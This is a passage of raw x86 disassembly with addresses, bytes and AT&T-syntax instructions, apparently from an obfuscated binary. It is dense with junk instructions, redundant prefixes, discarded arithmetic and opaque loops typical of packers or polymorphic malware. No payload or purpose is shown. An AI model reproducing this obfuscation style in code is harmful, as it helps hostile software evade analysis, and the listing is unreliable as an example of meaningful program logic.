  409d51:	c6 c4 13             	mov    $0x13,%ah
  409d54:	8d 15 1c 0e f8 19    	lea    0x19f80e1c,%edx
  409d5a:	89 ce                	mov    %ecx,%esi
  409d5c:	81 c3 23 69 00 00    	add    $0x6923,%ebx
  409d62:	2c 1e                	sub    $0x1e,%al
  409d64:	0f b7 ff             	movzwl %di,%edi
  409d67:	3d f5 cc 5f ca       	cmp    $0xca5fccf5,%eax
  409d6c:	81 c3 54 0e 00 00    	add    $0xe54,%ebx
  409d72:	89 e8                	mov    %ebp,%eax
  409d74:	52                   	push   %edx
  409d75:	0f b6 c7             	movzbl %bh,%eax
  409d78:	c7 c0 52 35 be a9    	mov    $0xa9be3552,%eax
  409d7e:	2d b4 a8 ea 21       	sub    $0x21eaa8b4,%eax
  409d83:	0f be c1             	movsbl %cl,%eax
  409d86:	4a                   	dec    %edx
  409d87:	45                   	inc    %ebp
  409d88:	fe c7                	inc    %bh
  409d8a:	f3 23 f9             	repz and %ecx,%edi
  409d8d:	8a e3                	mov    %bl,%ah
  409d8f:	0a f7                	or     %bh,%dh
  409d91:	c7 c6 bc c6 e6 22    	mov    $0x22e6c6bc,%esi
  409d97:	0f bf fe             	movswl %si,%edi
  409d9a:	89 f3                	mov    %esi,%ebx
  409d9c:	8d 2d 8e 15 64 55    	lea    0x5564158e,%ebp
  409da2:	8d 35 9c 6e 0f fc    	lea    0xfc0f6e9c,%esi
  409da8:	f2 35 14 ed 00 00    	repnz xor $0xed14,%eax
  409dae:	39 ee                	cmp    %ebp,%esi
  409db0:	8b d7                	mov    %edi,%edx
  409db2:	81 fb c1 d6 1e cd    	cmp    $0xcd1ed6c1,%ebx
  409db8:	85 c7                	test   %eax,%edi
  409dba:	84 f1                	test   %dh,%cl
  409dbc:	6a 00                	push   $0x0
  409dbe:	5f                   	pop    %edi
  409dbf:	88 d8                	mov    %bl,%al
  409dc1:	4b                   	dec    %ebx
  409dc2:	0f af f3             	imul   %ebx,%esi
  409dc5:	f2 04 2f             	repnz add $0x2f,%al
  409dc8:	73 04                	jae    0x409dce
  409dca:	fe c4                	inc    %ah
  409dcc:	88 ef                	mov    %ch,%bh
  409dce:	81 c7 02 f1 ff ff    	add    $0xfffff102,%edi
  409dd4:	c6 c0 3c             	mov    $0x3c,%al
  409dd7:	81 c7 ff 0e 00 00    	add    $0xeff,%edi
  409ddd:	33 d8                	xor    %eax,%ebx
  409ddf:	c7 c6 70 17 9e 82    	mov    $0x829e1770,%esi
  409de5:	85 ca                	test   %ecx,%edx
  409de7:	21 fe                	and    %edi,%esi
  409de9:	1c b5                	sbb    $0xb5,%al
  409deb:	8d 05 be 70 21 e0    	lea    0xe02170be,%eax
  409df1:	29 d6                	sub    %edx,%esi
  409df3:	81 ff ff 01 00 00    	cmp    $0x1ff,%edi
  409df9:	0f 8c c0 ff ff ff    	jl     0x409dbf
  409dff:	ff c3                	inc    %ebx
  409e01:	f3 69 f3 e2 41 dc 77 	repz imul $0x77dc41e2,%ebx,%esi
  409e08:	f6 c1 db             	test   $0xdb,%cl
  409e0b:	84 cb                	test   %cl,%bl
  409e0d:	0f af f3             	imul   %ebx,%esi
  409e10:	8a d5                	mov    %ch,%dl
  409e12:	32 d1                	xor    %cl,%dl
  409e14:	0f b6 d3             	movzbl %bl,%edx
  409e17:	46                   	inc    %esi
  409e18:	f3 3b d8             	repz cmp %eax,%ebx
  409e1b:	8d 1d 54 7d 36 0f    	lea    0xf367d54,%ebx
  409e21:	12 f8                	adc    %al,%bh
  409e23:	8b eb                	mov    %ebx,%ebp
  409e25:	70 02                	jo     0x409e29
  409e27:	23 f0                	and    %eax,%esi
  409e29:	f3 bb 34 7f 92 75    	repz mov $0x75927f34,%ebx
  409e2f:	b3 e2                	mov    $0xe2,%bl
  409e31:	8a db                	mov    %bl,%bl
  409e33:	f3 83 e7 00          	repz and $0x0,%edi
  409e37:	39 db                	cmp    %ebx,%ebx
  409e39:	0f af f5             	imul   %ebp,%esi
  409e3c:	80 ff 33             	cmp    $0x33,%bh
  409e3f:	0b f8                	or     %eax,%edi
  409e41:	c7 c3 1f bc 62 e0    	mov    $0xe062bc1f,%ebx
  409e47:	88 f3                	mov    %dh,%bl
  409e49:	bb e8 30 d3 cc       	mov    $0xccd330e8,%ebx
  409e4e:	c6 c3 8a             	mov    $0x8a,%bl
  409e51:	8d 2f                	lea    (%edi),%ebp
  409e53:	8b d8                	mov    %eax,%ebx
  409e55:	81 ff d5 dc 00 00    	cmp    $0xdcd5,%edi
  409e5b:	75 02                	jne    0x409e5f
  409e5d:	89 d6                	mov    %edx,%esi
  409e5f:	8d 55 00             	lea    0x0(%ebp),%edx
  409e62:	f7 c5 d3 8b 43 03    	test   $0x3438bd3,%ebp
  409e68:	80 d7 ae             	adc    $0xae,%bh
  409e6b:	84 fe                	test   %bh,%dh
  409e6d:	85 dd                	test   %ebx,%ebp
  409e6f:	2b c2                	sub    %edx,%eax
  409e71:	8d 35 97 7c 0a 74    	lea    0x740a7c97,%esi
  409e77:	89 de                	mov    %ebx,%esi
  409e79:	84 f6                	test   %dh,%dh
  409e7b:	84 d0                	test   %dl,%al
  409e7d:	8b f0                	mov    %eax,%esi
  409e7f:	6a 00                	push   $0x0
  409e81:	5d                   	pop    %ebp
  409e82:	f3 89 d7             	repz mov %edx,%edi
  409e85:	0f af d3             	imul   %ebx,%edx
  409e88:	f3 c6 c3 33          	repz mov $0x33,%bl
  409e8c:	c6 c6 1a             	mov    $0x1a,%dh
  409e8f:	fe c4                	inc    %ah
  409e91:	81 c5 6b 02 00 00    	add    $0x26b,%ebp
  409e97:	8a d7                	mov    %bh,%dl
  409e99:	81 ed 6a 02 00 00    	sub    $0x26a,%ebp
  409e9f:	84 de                	test   %bl,%dh
  409ea1:	8d 05 e5 70 15 a0    	lea    0xa01570e5,%eax
  409ea7:	f7 c6 74 3d 72 36    	test   $0x36723d74,%esi
  409ead:	eb 08                	jmp    0x409eb7
  409eaf:	89 de                	mov    %ebx,%esi
  409eb1:	c7 c7 f5 34 7d 9b    	mov    $0x9b7d34f5,%edi
  409eb7:	b6 9c                	mov    $0x9c,%dh
  409eb9:	81 fd 0c 03 00 00    	cmp    $0x30c,%ebp
  409ebf:	0f 86 bd ff ff ff    	jbe    0x409e82
  409ec5:	88 ea                	mov    %ch,%dl
  409ec7:	85 ee                	test   %ebp,%esi
  409ec9:	68 79 67 9c 00       	push   $0x9c6779
  409ece:	84 f0                	test   %dh,%al
  409ed0:	0f be d3             	movsbl %bl,%edx
  409ed3:	18 ee                	sbb    %ch,%dh
  409ed5:	f2 84 cb             	repnz test %cl,%bl
  409ed8:	8d 05 e5 a7 d4 d6    	lea    0xd6d4a7e5,%eax
  409ede:	f7 c3 c3 33 5b 83    	test   $0x835b33c3,%ebx
  409ee4:	69 df c8 86 8c 89    	imul   $0x898c86c8,%edi,%ebx
  409eea:	89 f2                	mov    %esi,%edx
  409eec:	84 ef                	test   %ch,%bh
  409eee:	8a fa                	mov    %dl,%bh
  409ef0:	ba f6 43 05 07       	mov    $0x70543f6,%edx
  409ef5:	81 f7 a5 88 b7 2d    	xor    $0x2db788a5,%edi
  409efb:	0f b6 ff             	movzbl %bh,%edi
  409efe:	88 d0                	mov    %dl,%al
  409f00:	86 e0                	xchg   %ah,%al
  409f02:	0f bf fd             	movswl %bp,%edi
  409f05:	8d 3b                	lea    (%ebx),%edi
  409f07:	83 e0 00             	and    $0x0,%eax
  409f0a:	33 c7                	xor    %edi,%eax
  409f0c:	89 ff                	mov    %edi,%edi
  409f0e:	bf c7 4f 23 e8       	mov    $0xe8234fc7,%edi
  409f13:	8b d0                	mov    %eax,%edx
  409f15:	0f af f9             	imul   %ecx,%edi
  409f18:	f3 c7 c7 55 05 71 6b 	repz mov $0x6b710555,%edi
  409f1f:	8b f2                	mov    %edx,%esi
  409f21:	85 fa                	test   %edi,%edx
  409f23:	73 01                	jae    0x409f26
  409f25:	f3 f2 8b fe          	repz repnz mov %esi,%edi
  409f29:	86 c6                	xchg   %al,%dh
  409f2b:	8d 1e                	lea    (%esi),%ebx
  409f2d:	c7 c2 c1 e5 37 3d    	mov    $0x3d37e5c1,%edx
  409f33:	f6 c7 6c             	test   $0x6c,%bh
  409f36:	33 ed                	xor    %ebp,%ebp
  409f38:	81 d7 12 9d 79 4b    	adc    $0x4b799d12,%edi
  409f3e:	87 eb                	xchg   %ebp,%ebx
  409f40:	81 d7 84 6a 0d 51    	adc    $0x510d6a84,%edi
  409f46:	8b d6                	mov    %esi,%edx
  409f48:	8b f6                	mov    %esi,%esi
  409f4a:	1a d6                	sbb    %dh,%dl
  409f4c:	b7 a7                	mov    $0xa7,%bh
  409f4e:	33 d7                	xor    %edi,%edx
  409f50:	0f af dd             	imul   %ebp,%ebx
  409f53:	85 d8                	test   %ebx,%eax
  409f55:	78 03                	js     0x409f5a
  409f57:	f6 c0 b9             	test   $0xb9,%al
  409f5a:	0f b6 de             	movzbl %dh,%ebx
  409f5d:	31 cf                	xor    %ecx,%edi
  409f5f:	0f af fe             	imul   %esi,%edi
  409f62:	fe c8                	dec    %al
  409f64:	68 4b f8 09 00       	push   $0x9f84b
  409f69:	1c 05                	sbb    $0x5,%al
  409f6b:	69 c7 d7 7b 5b bb    	imul   $0xbb5b7bd7,%edi,%eax
  409f71:	5a                   	pop    %edx
  409f72:	f2 47                	repnz inc %edi
  409f74:	81 ea d9 dc 09 00    	sub    $0x9dcd9,%edx
  409f7a:	0f af de             	imul   %esi,%ebx
  409f7d:	2b f6                	sub    %esi,%esi
  409f7f:	1a f8                	sbb    %al,%bh
  409f81:	81 f5 a6 95 eb b3    	xor    $0xb3eb95a6,%ebp
  409f87:	33 f2                	xor    %edx,%esi
  409f89:	fe c3                	inc    %bl
  409f8b:	81 ee 80 0d 00 00    	sub    $0xd80,%esi
  409f91:	80 c8 54             	or     $0x54,%al
  409f94:	0f bf fa             	movswl %dx,%edi
  409f97:	85 c2                	test   %eax,%edx
  409f99:	72 09                	jb     0x409fa4
  409f9b:	2d 3f 2c 26 3a       	sub    $0x3a262c3f,%eax
  409fa0:	88 f8                	mov    %bh,%al
  409fa2:	fe c3                	inc    %bl
  409fa4:	8d 05 bb b9 f8 ce    	lea    0xcef8b9bb,%eax
  409faa:	81 ee eb f5 ff ff    	sub    $0xfffff5eb,%esi
  409fb0:	8d 2d 88 54 55 38    	lea    0x38555488,%ebp
  409fb6:	29 c3                	sub    %eax,%ebx
  409fb8:	1b d5                	sbb    %ebp,%edx
  409fba:	81 ee 16 0a 00 00    	sub    $0xa16,%esi
  409fc0:	0f b6 ea             	movzbl %dl,%ebp
  409fc3:	29 d2                	sub    %edx,%edx
  409fc5:	0f af fe             	imul   %esi,%edi
  409fc8:	c7 c5 47 5c 9c 2e    	mov    $0x2e9c5c47,%ebp
  409fce:	0f af da             	imul   %edx,%ebx
  409fd1:	81 fe 98 01 00 00    	cmp    $0x198,%esi
  409fd7:	0f 83 b4 ff ff ff    	jae    0x409f91
  409fdd:	bf 9e 1a 2d 93       	mov    $0x932d1a9e,%edi
  409fe2:	85 f8                	test   %edi,%eax
  409fe4:	77 08                	ja     0x409fee
  409fe6:	84 c4                	test   %al,%ah
  409fe8:	8d 05 f3 db 89 46    	lea    0x4689dbf3,%eax
  409fee:	88 d2                	mov    %dl,%dl
  409ff0:	68 95 66 c0 00       	push   $0xc06695
  409ff5:	fe c3                	inc    %bl
  409ff7:	f3 0f be f0          	repz movsbl %al,%esi
  409ffb:	f2 0f af ff          	repnz imul %edi,%edi
  409fff:	b4 7c                	mov    $0x7c,%ah
  40a001:	c7 c0 e7 8a 7d 43    	mov    $0x437d8ae7,%eax
  40a007:	85 cb                	test   %ecx,%ebx
  40a009:	74 06                	je     0x40a011
  40a00b:	1b db                	sbb    %ebx,%ebx
  40a00d:	08 f4                	or     %dh,%ah
  40a00f:	b4 cd                	mov    $0xcd,%ah
  40a011:	81 ea 4b 64 00 00    	sub    $0x644b,%edx
  40a017:	f7 c7 1b b1 98 d7    	test   $0xd798b11b,%edi
  40a01d:	81 c2 55 0d 00 00    	add    $0xd55,%edx
  40a023:	88 fc                	mov    %bh,%ah
  40a025:	85 c8                	test   %ecx,%eax
  40a027:	0f bf d3             	movswl %bx,%edx
  40a02a:	89 fb                	mov    %edi,%ebx
  40a02c:	3d 34 4c de f7       	cmp    $0xf7de4c34,%eax
  40a031:	0f af db             	imul   %ebx,%ebx
  40a034:	8a c0                	mov    %al,%al
  40a036:	8a fc                	mov    %ah,%bh
  40a038:	81 cf 76 bf 0b a9    	or     $0xa90bbf76,%edi
  40a03e:	81 f2 a1 04 1e 9c    	xor    $0x9c1e04a1,%edx
  40a044:	0f b6 d8             	movzbl %al,%ebx
  40a047:	68 24 00 00 00       	push   $0x24
  40a04c:	85 ff                	test   %edi,%edi
  40a04e:	58                   	pop    %eax
  40a04f:	87 d7                	xchg   %edx,%edi
  40a051:	69 d0 cc 56 27 01    	imul   $0x12756cc,%eax,%edx
  40a057:	f3 85 ea             	repz test %ebp,%edx
  40a05a:	46                   	inc    %esi
  40a05b:	88 f3                	mov    %dh,%bl
  40a05d:	8b f7                	mov    %edi,%esi
  40a05f:	88 f3                	mov    %dh,%bl
  40a061:	86 d3                	xchg   %dl,%bl
  40a063:	ba b2 0e a7 49       	mov    $0x49a70eb2,%edx
  40a068:	69 d6 97 92 74 dd    	imul   $0xdd749297,%esi,%edx
  40a06e:	0f b6 d3             	movzbl %bl,%edx
  40a071:	6b d2 00             	imul   $0x0,%edx,%edx
  40a074:	0b d0                	or     %eax,%edx
  40a076:	8b da                	mov    %edx,%ebx
  40a078:	0f b7 d1             	movzwl %cx,%edx
  40a07b:	8b f3                	mov    %ebx,%esi
  40a07d:	8b d6                	mov    %esi,%edx
  40a07f:	b7 09                	mov    $0x9,%bh
  40a081:	69 df fb 25 ca 0f    	imul   $0xfca25fb,%edi,%ebx
  40a087:	8d 3e                	lea    (%esi),%edi
  40a089:	70 05                	jo     0x40a090
  40a08b:	43                   	inc    %ebx
  40a08c:	f2 0f be dc          	repnz movsbl %ah,%ebx
  40a090:	73 02                	jae    0x40a094
  40a092:	b7 80                	mov    $0x80,%bh
  40a094:	8b ef                	mov    %edi,%ebp
  40a096:	b2 17                	mov    $0x17,%dl
  40a098:	0f bf f3             	movswl %bx,%esi
  40a09b:	b2 5c                	mov    $0x5c,%dl
  40a09d:	0f b7 f9             	movzwl %cx,%edi
  40a0a0:	8d 3d 63 a6 19 b6    	lea    0xb619a663,%edi
  40a0a6:	6b ed 3e             	imul   $0x3e,%ebp,%ebp
  40a0a9:	38 f8                	cmp    %bh,%al
  40a0ab:	f7 c1 14 e8 67 14    	test   $0x1467e814,%ecx
  40a0b1:	2b fa                	sub    %edx,%edi
  40a0b3:	ff cf                	dec    %edi
  40a0b5:	88 c7                	mov    %al,%bh
  40a0b7:	81 ce 27 73 3d c1    	or     $0xc13d7327,%esi
  40a0bd:	eb 06                	jmp    0x40a0c5
  40a0bf:	c7 c6 ab b9 4e 84    	mov    $0x844eb9ab,%esi
  40a0c5:	33 db                	xor    %ebx,%ebx
  40a0c7:	80 e0 ef             	and    $0xef,%al
  40a0ca:	81 f3 6b f2 ff ff    	xor    $0xfffff26b,%ebx
  40a0d0:	89 de                	mov    %ebx,%esi
  40a0d2:	0f af c1             	imul   %ecx,%eax
  40a0d5:	81 f3 59 00 00 00    	xor    $0x59,%ebx
  40a0db:	71 02                	jno    0x40a0df
  40a0dd:	87 f0                	xchg   %esi,%eax
  40a0df:	53                   	push   %ebx
  40a0e0:	80 d8 38             	sbb    $0x38,%al
  40a0e3:	5a                   	pop    %edx
  40a0e4:	81 ff e8 16 00 00    	cmp    $0x16e8,%edi
  40a0ea:	75 0c                	jne    0x40a0f8
  40a0ec:	8d 3d 86 a9 32 58    	lea    0x5832a986,%edi
  40a0f2:	69 c6 16 92 d4 5f    	imul   $0x5fd49216,%esi,%eax
  40a0f8:	f3 86 fb             	repz xchg %bh,%bl
  40a0fb:	33 c1                	xor    %ecx,%eax
  40a0fd:	2b ea                	sub    %edx,%ebp
  40a0ff:	69 fa 71 17 7d 74    	imul   $0x747d1771,%edx,%edi
  40a105:	b7 eb                	mov    $0xeb,%bh
  40a107:	89 fe                	mov    %edi,%esi
  40a109:	81 ed cf 0d 00 00    	sub    $0xdcf,%ebp
  40a10f:	46                   	inc    %esi
  40a110:	84 db                	test   %bl,%bl
  40a112:	8d 05 14 04 d3 c8    	lea    0xc8d30414,%eax
  40a118:	85 db                	test   %ebx,%ebx
  40a11a:	72 02                	jb     0x40a11e
  40a11c:	b0 22                	mov    $0x22,%al
  40a11e:	ff ca                	dec    %edx
  40a120:	81 fd b1 03 00 00    	cmp    $0x3b1,%ebp
  40a126:	0f 85 7d ff ff ff    	jne    0x40a0a9
  40a12c:	19 ee                	sbb    %ebp,%esi
  40a12e:	0f be d6             	movsbl %dh,%edx
  40a131:	0f af f2             	imul   %edx,%esi
  40a134:	20 f2                	and    %dh,%dl
  40a136:	85 ce                	test   %ecx,%esi
  40a138:	74 02                	je     0x40a13c
  40a13a:	8b ff                	mov    %edi,%edi
  40a13c:	87 fb                	xchg   %edi,%ebx
  40a13e:	69 e8 f1 07 6c ea    	imul   $0xea6c07f1,%eax,%ebp
  40a144:	0f af fa             	imul   %edx,%edi
  40a147:	f3 f6 c7 28          	repz test $0x28,%bh
  40a14b:	84 fe                	test   %bh,%dh
  40a14d:	3b d3                	cmp    %ebx,%edx
  40a14f:	8a e3                	mov    %bl,%ah
  40a151:	86 e2                	xchg   %ah,%dl
  40a153:	69 d6 72 de f6 7e    	imul   $0x7ef6de72,%esi,%edx
  40a159:	8d 3d 49 ac d3 9e    	lea    0x9ed3ac49,%edi
  40a15f:	c7 c2 67 b1 f6 3b    	mov    $0x3bf6b167,%edx
  40a165:	3a c5                	cmp    %ch,%al
  40a167:	f7 c1 4e 53 50 3b    	test   $0x3b50534e,%ecx
  40a16d:	0f af df             	imul   %edi,%ebx
  40a170:	31 f5                	xor    %esi,%ebp
  40a172:	0f af e8             	imul   %eax,%ebp
  40a175:	0d 8b d1 cb 25       	or     $0x25cbd18b,%eax
  40a17a:	b8 92 a5 52 0e       	mov    $0xe52a592,%eax
  40a17f:	8d 35 4b 0e 00 00    	lea    0xe4b,%esi
  40a185:	89 fa                	mov    %edi,%edx
  40a187:	88 e4                	mov    %ah,%ah
  40a189:	81 f6 11 0d 00 00    	xor    $0xd11,%esi
  40a18f:	84 ec                	test   %ch,%ah
  40a191:	c7 c7 65 bf 4f e0    	mov    $0xe04fbf65,%edi
  40a197:	48                   	dec    %eax
  40a198:	bb 7c b5 25 a1       	mov    $0xa125b57c,%ebx
  40a19d:	b2 eb                	mov    $0xeb,%dl
  40a19f:	81 ee 01 00 00 00    	sub    $0x1,%esi
  40a1a5:	40                   	inc    %eax
  40a1a6:	69 da 7f 8f d9 bc    	imul   $0xbcd98f7f,%edx,%ebx
  40a1ac:	fe c6                	inc    %dh
  40a1ae:	88 c7                	mov    %al,%bh
  40a1b0:	71 09                	jno    0x40a1bb
  40a1b2:	69 dd 8d c5 0f 27    	imul   $0x270fc58d,%ebp,%ebx
  40a1b8:	3a dd                	cmp    %ch,%bl
  40a1ba:	f3 f2 81 fe ad 00 00 	repz repnz cmp $0xad,%esi
  40a1c1:	00 
  40a1c2:	0f 83 c7 ff ff ff    	jae    0x40a18f
  40a1c8:	f3 84 d0             	repz test %dl,%al
  40a1cb:	14 56                	adc    $0x56,%al
  40a1cd:	f6 c4 eb             	test   $0xeb,%ah
  40a1d0:	72 04                	jb     0x40a1d6
  40a1d2:	0f bf f8             	movswl %ax,%edi
  40a1d5:	f2 53                	repnz push %ebx
  40a1d7:	68 56 53 84 00       	push   $0x845356
  40a1dc:	81 ed 56 cd d4 94    	sub    $0x94d4cd56,%ebp
  40a1e2:	c6 c7 d7             	mov    $0xd7,%bh
  40a1e5:	f2 8a d2             	repnz mov %dl,%dl
  40a1e8:	8d 15 48 ef 4d a9    	lea    0xa94def48,%edx
  40a1ee:	2d b7 77 cf 2e       	sub    $0x2ecf77b7,%eax
  40a1f3:	f2 81 f6 5e 72 00 00 	repnz xor $0x725e,%esi
  40a1fa:	69 d9 84 ed f2 ec    	imul   $0xecf2ed84,%ecx,%ebx
  40a200:	fe c4                	inc    %ah
  40a202:	f3 89 f6             	repz mov %esi,%esi
  40a205:	48                   	dec    %eax
  40a206:	69 d0 8d 42 84 4e    	imul   $0x4e84428d,%eax,%edx
  40a20c:	0a dc                	or     %ah,%bl
  40a20e:	0f af d9             	imul   %ecx,%ebx
  40a211:	88 f2                	mov    %dh,%dl
  40a213:	fe ce                	dec    %dh
  40a215:	c7 c6 71 6b b2 d7    	mov    $0xd7b26b71,%esi
  40a21b:	34 88                	xor    $0x88,%al
  40a21d:	c7 c0 fc 05 5a bf    	mov    $0xbf5a05fc,%eax
  40a223:	35 dd a9 18 d3       	xor    $0xd318a9dd,%eax
  40a228:	0f be f9             	movsbl %cl,%edi
  40a22b:	68 3f d2 e5 00       	push   $0xe5d23f
  40a230:	68 51 94 e0 00       	push   $0xe09451
  40a235:	f2 86 de             	repnz xchg %bl,%dh
  40a238:	42                   	inc    %edx
  40a239:	f6 c4 03             	test   $0x3,%ah
  40a23c:	11 db                	adc    %ebx,%ebx
  40a23e:	0f af e8             	imul   %eax,%ebp
  40a241:	86 e0                	xchg   %ah,%al
  40a243:	c6 c3 98             	mov    $0x98,%bl
  40a246:	1b da                	sbb    %edx,%ebx
  40a248:	88 e3                	mov    %ah,%bl
  40a24a:	89 f8                	mov    %edi,%eax
  40a24c:	f3 68 ba 37 91 00    	repz push $0x9137ba
  40a252:	50                   	push   %eax
  40a253:	02 da                	add    %dl,%bl
  40a255:	80 d2 c7             	adc    $0xc7,%dl
  40a258:	28 ce                	sub    %cl,%dh
  40a25a:	8d 05 06 f7 83 76    	lea    0x7683f706,%eax
  40a260:	35 be 19 27 f7       	xor    $0xf72719be,%eax
  40a265:	0f af db             	imul   %ebx,%ebx
  40a268:	0f af db             	imul   %ebx,%ebx
  40a26b:	1d 2d dc 5b a3       	sbb    $0xa35bdc2d,%eax
  40a270:	0f af d8             	imul   %eax,%ebx
  40a273:	87 ef                	xchg   %ebp,%edi
  40a275:	0f af e9             	imul   %ecx,%ebp
  40a278:	0f bf ea             	movswl %dx,%ebp
  40a27b:	f3 bb 15 14 c3 e7    	repz mov $0xe7c31415,%ebx
  40a281:	f7 c0 d4 1a 76 3c    	test   $0x3c761ad4,%eax
  40a287:	8d 2d f1 1b 10 fa    	lea    0xfa101bf1,%ebp
  40a28d:	69 e8 4a 7c 82 74    	imul   $0x74827c4a,%eax,%ebp
  40a293:	fe c8                	dec    %al
  40a295:	c7 c0 ff ca 28 67    	mov    $0x6728caff,%eax
  40a29b:	88 ea                	mov    %ch,%dl
  40a29d:	eb 06                	jmp    0x40a2a5
  40a29f:	8d 1d 15 61 eb 9c    	lea    0x9ceb6115,%ebx
  40a2a5:	81 ff e6 4f 00 00    	cmp    $0x4fe6,%edi
  40a2ab:	0f b6 ea             	movzbl %dl,%ebp
  40a2ae:	8d 15 5d 1b ac 3a    	lea    0x3aac1b5d,%edx
  40a2b4:	8a c3                	mov    %bl,%al
  40a2b6:	71 03                	jno    0x40a2bb
  40a2b8:	c6 c0 2e             	mov    $0x2e,%al
  40a2bb:	eb 04                	jmp    0x40a2c1
  40a2bd:	20 e4                	and    %ah,%ah
  40a2bf:	87 f6                	xchg   %esi,%esi
  40a2c1:	8b c7                	mov    %edi,%eax
  40a2c3:	0f be f7             	movsbl %bh,%esi
  40a2c6:	0f af c1             	imul   %ecx,%eax
  40a2c9:	69 c5 8d 01 69 7d    	imul   $0x7d69018d,%ebp,%eax
  40a2cf:	88 ec                	mov    %ch,%ah
  40a2d1:	f7 c0 2e 46 af b0    	test   $0xb0af462e,%eax
  40a2d7:	68 ab 8e fb ff       	push   $0xfffb8eab
  40a2dc:	20 ec                	and    %ch,%ah
  40a2de:	fe c0                	inc    %al
  40a2e0:	5d                   	pop    %ebp
  40a2e1:	80 e0 85             	and    $0x85,%al
  40a2e4:	81 f5 58 08 00 00    	xor    $0x858,%ebp
  40a2ea:	0f be fd             	movsbl %ch,%edi
  40a2ed:	6b db 00             	imul   $0x0,%ebx,%ebx
  40a2f0:	8d 3d eb c5 7e dd    	lea    0xdd7ec5eb,%edi
  40a2f6:	0f c1 eb             	xadd   %ebp,%ebx
  40a2f9:	ff ce                	dec    %esi
  40a2fb:	c7 c0 5a e0 18 74    	mov    $0x7418e05a,%eax
  40a301:	f6 c0 00             	test   $0x0,%al
  40a304:	81 c3 43 84 04 00    	add    $0x48443,%ebx
  40a30a:	0f bf c5             	movswl %bp,%eax
  40a30d:	c7 c6 2b 11 2c 8d    	mov    $0x8d2c112b,%esi
  40a313:	87 d3                	xchg   %edx,%ebx
  40a315:	77 06                	ja     0x40a31d
  40a317:	40                   	inc    %eax
  40a318:	0f af f2             	imul   %edx,%esi
  40a31b:	89 c7                	mov    %eax,%edi
  40a31d:	81 f2 fc 04 00 00    	xor    $0x4fc,%edx
  40a323:	0f bf fe             	movswl %si,%edi
  40a326:	c7 c5 24 15 e9 a8    	mov    $0xa8e91524,%ebp
  40a32c:	8d 1d 17 47 e7 05    	lea    0x5e74717,%ebx
  40a332:	8d 1d 57 63 71 21    	lea    0x21716357,%ebx
  40a338:	81 ea 01 00 00 00    	sub    $0x1,%edx
  40a33e:	bd 8e 8c b0 a6       	mov    $0xa6b08c8e,%ebp
  40a343:	0f af f3             	imul   %ebx,%esi
  40a346:	8d 05 15 ca ab 5f    	lea    0x5fabca15,%eax
  40a34c:	4b                   	dec    %ebx
  40a34d:	f7 c0 33 80 ab 52    	test   $0x52ab8033,%eax
  40a353:	69 c1 b9 32 34 b4    	imul   $0xb43432b9,%ecx,%eax
  40a359:	c7 c5 31 9f 58 30    	mov    $0x30589f31,%ebp
  40a35f:	11 dd                	adc    %ebx,%ebp
  40a361:	81 fa 24 00 00 00    	cmp    $0x24,%edx
  40a367:	0f 85 b6 ff ff ff    	jne    0x40a323
  40a36d:	f3 f2 55             	repz repnz push %ebp
  40a370:	0f af f2             	imul   %edx,%esi
  40a373:	22 c4                	and    %ah,%al
  40a375:	89 f5                	mov    %esi,%ebp
  40a377:	8d 3d 88 c6 83 bc    	lea    0xbc83c688,%edi
  40a37d:	13 f3                	adc    %ebx,%esi
  40a37f:	f6 c4 5a             	test   $0x5a,%ah
  40a382:	3b d9                	cmp    %ecx,%ebx
  40a384:	77 06                	ja     0x40a38c
  40a386:	89 c6                	mov    %eax,%esi
  40a388:	86 f7                	xchg   %dh,%bh
  40a38a:	10 f7                	adc    %dh,%bh
  40a38c:	b2 98                	mov    $0x98,%dl
  40a38e:	88 d3                	mov    %dl,%bl
  40a390:	51                   	push   %ecx
  40a391:	c7 c7 be 75 94 61    	mov    $0x619475be,%edi
  40a397:	80 eb 93             	sub    $0x93,%bl
  40a39a:	86 c0                	xchg   %al,%al
  40a39c:	77 0c                	ja     0x40a3aa
  40a39e:	c7 c3 bc c8 af a0    	mov    $0xa0afc8bc,%ebx
  40a3a4:	0f b7 ff             	movzwl %di,%edi
  40a3a7:	0f af f7             	imul   %edi,%esi
  40a3aa:	08 db                	or     %bl,%bl
  40a3ac:	f6 c1 b8             	test   $0xb8,%cl
  40a3af:	22 d8                	and    %al,%bl
  40a3b1:	0f bf dd             	movswl %bp,%ebx
  40a3b4:	3b ef                	cmp    %edi,%ebp
  40a3b6:	18 ea                	sbb    %ch,%dl
  40a3b8:	f7 c3 f1 cb 9a 7e    	test   $0x7e9acbf1,%ebx
  40a3be:	69 d3 e7 44 65 b5    	imul   $0xb56544e7,%ebx,%edx
  40a3c4:	8a e2                	mov    %dl,%ah
  40a3c6:	38 d7                	cmp    %dl,%bh
  40a3c8:	02 c5                	add    %ch,%al
  40a3ca:	80 ce 49             	or     $0x49,%dh
  40a3cd:	8b f7                	mov    %edi,%esi
  40a3cf:	f3 86 e7             	repz xchg %ah,%bh
  40a3d2:	68 09 bf 10 00       	push   $0x10bf09
  40a3d7:	03 d7                	add    %edi,%edx
  40a3d9:	fe ca                	dec    %dl
  40a3db:	84 e7                	test   %ah,%bh
  40a3dd:	f2 69 c0 77 42 5c ec 	repnz imul $0xec5c4277,%eax,%eax
  40a3e4:	20 fb                	and    %bh,%bl
  40a3e6:	8d 3d b4 49 d1 a1    	lea    0xa1d149b4,%edi
  40a3ec:	05 f1 08 20 42       	add    $0x422008f1,%eax
  40a3f1:	3b e9                	cmp    %ecx,%ebp
  40a3f3:	74 06                	je     0x40a3fb
  40a3f5:	fe ca                	dec    %dl
  40a3f7:	21 fd                	and    %edi,%ebp
  40a3f9:	00 c6                	add    %al,%dh
  40a3fb:	f7 c1 fd fc f1 13    	test   $0x13f1fcfd,%ecx
  40a401:	b8 fd 49 00 00       	mov    $0x49fd,%eax
  40a406:	4d                   	dec    %ebp
  40a407:	69 fd 0d 25 c6 68    	imul   $0x68c6250d,%ebp,%edi
  40a40d:	35 4e 58 00 00       	xor    $0x584e,%eax
  40a412:	bd b6 64 1b f3       	mov    $0xf31b64b6,%ebp
  40a417:	20 f3                	and    %dh,%bl
  40a419:	35 e7 08 00 00       	xor    $0x8e7,%eax
  40a41e:	88 c7                	mov    %al,%bh
  40a420:	0f af fe             	imul   %esi,%edi
  40a423:	8d 30                	lea    (%eax),%esi
  40a425:	f6 c4 be             	test   $0xbe,%ah
  40a428:	81 ea 08 b0 61 4c    	sub    $0x4c61b008,%edx
  40a42e:	1b dd                	sbb    %ebp,%ebx
  40a430:	81 f6 04 4e 00 00    	xor    $0x4e04,%esi
  40a436:	eb 07                	jmp    0x40a43f
